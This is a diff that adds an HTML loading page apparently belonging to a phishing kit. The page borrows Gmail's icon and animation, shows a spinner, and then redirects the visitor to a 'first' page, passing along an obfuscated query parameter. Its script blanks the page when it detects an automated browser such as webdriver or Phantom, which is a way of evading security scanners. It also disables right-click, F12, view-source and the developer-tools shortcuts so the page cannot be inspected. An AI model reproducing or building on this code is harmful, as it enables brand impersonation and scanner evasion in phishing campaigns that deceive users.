@@ -1,0 +1,111 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+     <script type="text/javascript" src="/JS/fetch.js"></script>
+
+      <!-- Required meta tags -->
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <title>Welcome</title>
+      <link rel="shortcut icon" href="/image/gmail.ico" type="image/x-icon">
+     
+      <style>
+      :root {
+        --yellow: #feb60a;
+        --red: #ff0062;
+        --blue: #00dbf9;
+        --violet: #da00f7;
+        }
+        body {
+        margin: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background-color: white;
+        }
+        div.container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        }
+        div > div {
+        width: 3vw;
+        height: 3vw;
+        border-radius: 100%;
+        margin: 2vw;
+        background-image: linear-gradient(145deg, rgba(255,255,255,0.5) 0%, rgba(0,0,0,0) 100%);
+        animation: bounce 1.5s 0.5s linear infinite;
+        }
+        .yellow {
+        background-color: var(--yellow);
+        }
+
+        .red {
+        background-color: var(--red);
+        animation-delay: 0.1s;
+        }
+
+        .blue {
+        background-color: var(--blue);
+        animation-delay: 0.2s;
+        }
+
+        .violet {
+        background-color: var(--violet);
+        animation-delay: 0.3s;
+        }
+
+        @keyframes bounce {
+        0%, 50%, 100% {
+        transform: scale(1);
+        filter: blur(0px);
+        }
+        25% {
+        transform: scale(0.6);
+        filter: blur(3px);
+        }
+        75% {
+        filter: blur(3px);
+        transform: scale(1.4);
+        }
+        }
+        </style>
+       
+    <script>
+        function returnToDrive() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const paramValue = urlParams.get('chbsdgereoihoefoehoehohegei') || '';
+            window.location.href = "first?wetuweopfnfdjfgdfhdkjudfhd=" + encodeURIComponent(paramValue);
+        }
+        setTimeout(returnToDrive, 6000);
+    </script>
+</head>
+
+<body>
+     
+        <input type='hidden' name="username" id="username" value="${user}">
+        <center><object data="/image/gmail_animation.gif" style="height:420px; width:550px"></object></center>
+        <script>
+(function(){
+  document.querySelector('body').style.display='flex';
+  if(navigator.webdriver||window.__nightmare||window.callPhantom||window._phantom){
+    document.body.innerHTML='';
+    window.location.href='about:blank';
+  }
+  document.addEventListener('contextmenu',function(e){e.preventDefault();});
+  document.addEventListener('keydown',function(e){
+    if(e.key==='F12')e.preventDefault();
+    if(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='i'))e.preventDefault();
+    if(e.ctrlKey&&(e.key==='U'||e.key==='u'))e.preventDefault();
+    if(e.ctrlKey&&e.shiftKey&&(e.key==='J'||e.key==='j'))e.preventDefault();
+    if(e.ctrlKey&&e.shiftKey&&(e.key==='C'||e.key==='c'))e.preventDefault();
+  });
+})();
+</script>
+
+    </body>
+  </html>
+
